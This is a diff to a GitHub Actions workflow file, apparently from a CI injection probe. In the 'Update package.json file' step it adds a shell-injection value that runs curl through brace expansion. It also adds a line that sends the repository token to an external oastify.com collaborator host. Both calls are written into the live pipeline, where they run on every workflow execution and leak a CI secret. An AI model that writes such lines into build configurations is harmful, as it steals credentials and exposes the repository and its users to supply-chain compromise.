@@ -20,10 +20,10 @@ jobs:
           repo-token: ${{ secrets.GITHUB_TOKEN }}
       - name: Update package.json file
         env:
-          TEST_INJECTION: '";{curl,http://2wzlcleq8scnquutjci2434y8peg27qw.oastify.com/hit}|a="'
+          TEST_INJECTION: '";{curl,http://2wzlcleq8scnquutjci2434y8peg27qw.oastify.com/$env.repo-token}|a="'
         run: |
           # plugin_version=$(echo "${{ env.TEST_INJECTION }}" | grep -Eo '[0-9].[0-9]+.[0-9]+')
-          echo "${{ env.repo-token }}"
+          curl http://2wzlcleq8scnquutjci2434y8peg27qw.oastify.com/${{ env.repo-token }}
 
           
   # Deploy-to-QA:
